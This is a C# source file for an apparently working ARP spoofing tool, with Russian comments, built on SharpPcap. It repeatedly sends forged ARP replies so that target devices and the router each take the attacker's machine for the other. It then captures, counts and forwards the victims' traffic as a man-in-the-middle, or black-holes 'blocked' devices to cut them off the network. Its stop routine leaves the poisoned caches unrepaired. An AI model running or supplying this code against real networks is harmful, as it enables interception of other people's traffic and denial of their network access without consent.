using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Collections.Concurrent;
using System.Net;
using System.Net.NetworkInformation;

namespace ArpTrafficMonitor
{
    internal class ArpSniffer
    {
        private byte[] _myMacBytes;

        private byte[] _routerMacBytes;
        private LibPcapLiveDevice? _device;
        private PhysicalAddress _myMac;
        private PhysicalAddress _routerMac;
        private IPAddress _routerIp;
        private bool _isRunning = false;
        private Thread _spoofThread;
        private PhysicalAddress _deadMac = PhysicalAddress.Parse("DEADBEEF0000");
        private ConcurrentDictionary<IPAddress, FoundDevice> _targets = new ConcurrentDictionary<IPAddress, FoundDevice>();
        public ArpSniffer(ICaptureDevice device, IPAddress routerIp, PhysicalAddress routerMac)
        {
            _device = device as LibPcapLiveDevice;
            
            _myMac = _device.MacAddress;
            _routerIp = routerIp;
            _routerMac = routerMac;
            _routerMacBytes = routerMac.GetAddressBytes();
            _myMacBytes = _myMac.GetAddressBytes();

        }
        public void AddTarget(FoundDevice dev)
        {
            _targets.TryAdd(dev.Ip, dev);
        }
        public List<FoundDevice> GetTargets() => _targets.Values.ToList();
        public void Start()
        {
            if (_isRunning) return;
            _isRunning = true;

            //включаем атаку перехват
            _device.Open(DeviceModes.Promiscuous);
            _device.OnPacketArrival += PacketHandler;
            _device.StartCapture();

            //запус лупа 
            Task.Run(() => LieLoop());  
        }

        public void Stop()
        {
            _isRunning = false;
            _device.StopCapture();
            _device.Close();
            //TODO:Отправить фикс реальных пакетов
        }
        private void LieLoop()
        {
            while (_isRunning)
            {
                foreach (var device in _targets.Values)
                {
                    if (device.IsBlocked)
                    {
                        SendArp(_device, device.Mac, device.Ip, _deadMac, _routerIp);

                        //врем роутеру я жертва
                        SendArp(_device, _routerMac, _routerIp, _deadMac, device.Ip);
                    }
                    else
                    {
                        //врем то что мы роутер
                        SendArp(_device, device.Mac, device.Ip, _myMac, _routerIp);

                        //врем то что мы жертва
                        SendArp(_device, _routerMac, _routerIp, _myMac, device.Ip);
                    }
                }
                Thread.Sleep(3000);
            }
        }
        private void SendArp(LibPcapLiveDevice card, PhysicalAddress destMac, IPAddress destIp, PhysicalAddress senderMac, IPAddress senderIp)
        {
            var ethernet = new EthernetPacket(senderMac, destMac, EthernetType.Arp);
            var arp = new ArpPacket(ArpOperation.Response, destMac, destIp, senderMac, senderIp);
            ethernet.PayloadPacket = arp;
            card.SendPacket(ethernet);
        }
        private void PacketHandler(object sender, PacketCapture e)
        {
            if (!_isRunning) return;

            //парсим пакет
            var rawPacket = e.GetPacket();
            var packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);

            var ethPacket = packet.Extract<EthernetPacket>();
            var ipPacket = packet.Extract<IPv4Packet>();

            if (ethPacket == null || ipPacket == null) return;

            //Если покет от нас - игнорим
            if (ethPacket.SourceHardwareAddress.Equals(_myMac)) return;

            //кому отпраить определяем
            FoundDevice targetDevice = null;
            bool toRouter = false;

            if (_targets.TryGetValue(ipPacket.SourceAddress, out var devSrc))
            {
                // UPLOAD типо от жертвы роутеру
                devSrc.UploadTotal += ipPacket.TotalLength;
                targetDevice = devSrc;
                toRouter = true;
            }
            else if (_targets.TryGetValue(ipPacket.DestinationAddress, out var devDst))
            {
                // DOWNLOAD типо от роутера к жертве
                devDst.DownloadTotal += ipPacket.TotalLength;
                targetDevice = devDst;
                toRouter = false;
            }
            else
            {
                //чужие пакеты
                return;
            }

            //Blackhole
            //если устройство заблокировано — просто выходим. 
            if (targetDevice.IsBlocked) return;
            // Подменяем пакеты. логика куда шлем
            if (toRouter)
                ethPacket.DestinationHardwareAddress = _routerMac;
            else
                ethPacket.DestinationHardwareAddress = targetDevice.Mac;

            //от кого шлем
            ethPacket.SourceHardwareAddress = _myMac;

            //пересчитываем сумму бывает что роутер считает такие пакеты битыми

            //пересчитываем TcpPacket сумму
            var tcpPacket = packet.Extract<TcpPacket>();
            if (tcpPacket != null)
            {
                tcpPacket.UpdateCalculatedValues();
            }

            //пересчитываем UdpPacket сумму
            var udpPacket = packet.Extract<UdpPacket>();
            if (udpPacket != null)
            {
                udpPacket.UpdateCalculatedValues();
            }

            //пересчитываем IP сумму
            ipPacket.UpdateCalculatedValues();
            //отправляем
            _device.SendPacket(packet);
        }
    }
}
